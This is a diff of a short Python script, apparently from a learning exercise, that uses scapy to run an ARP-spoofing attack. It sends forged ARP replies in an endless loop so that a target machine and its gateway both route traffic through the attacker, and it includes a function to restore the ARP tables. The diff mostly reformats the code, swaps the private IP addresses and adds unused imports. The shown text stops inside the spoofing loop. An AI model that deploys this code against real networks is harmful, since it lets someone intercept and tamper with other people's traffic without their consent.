@@ -1,36 +1,32 @@
 #!/usr/bin/python3
 
+from itertools import count
+from tabnanny import verbose
 import scapy.all as scapy
 import time
 
-
-def get_mac(ip):
-    arp_request = scapy.ARP(pdst=ip)
-    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_request_broadcast = broadcast/arp_request
-    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
-
+def get_mac(target_ip):
+    arp_request = scapy.ARP(pdst = target_ip)
+    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
+    answered_list = scapy.srp(broadcast/arp_request, timeout = 1, verbose = False)[0]
     return answered_list[0][1].hwsrc
-
 
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    scapy.send(packet, verbose=False)
-
-
-def restore(destination_ip, source_ip):
-    destination_mac = get_mac(destination_ip)
-    source_mac = get_mac(source_ip)
-    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
-    scapy.send(packet, count=4, verbose=False)
-
-
-target_ip = "192.168.235.134"
-gateway_ip = "192.168.235.2"
-
+    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
+    scapy.send(packet, verbose = False)
+    
+def restore(target_ip, real_ip):
+    target_mac = get_mac(target_ip)
+    real_mac = get_mac(real_ip)
+    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = real_ip, hwsrc = real_mac)
+    scapy.send(packet, verbose = False)
+    
+target_ip = "192.168.1.173"
+gateway_ip = "192.168.1.254"
+    
+sent_packets_count = 0
 try:
-    sent_packets_count = 0
     while True:
         spoof(target_ip, gateway_ip)
         spoof(gateway_ip, target_ip)
